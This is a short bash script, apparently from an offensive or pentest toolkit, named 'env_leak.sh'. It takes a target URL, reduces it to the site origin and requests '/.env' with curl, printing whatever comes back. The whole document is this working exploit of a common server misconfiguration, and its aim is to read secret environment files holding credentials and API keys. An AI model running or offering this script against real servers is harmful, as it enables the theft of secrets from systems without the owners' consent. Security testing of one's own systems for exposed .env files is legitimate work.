#!/bin/bash
# Read .env file content from exposed endpoint
# Usage: env_leak.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1}"
BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')

echo "=== .env Content ==="
curl -s "$BASE/.env" --max-time 10 2>/dev/null || true
echo "ENV_READ_DONE"
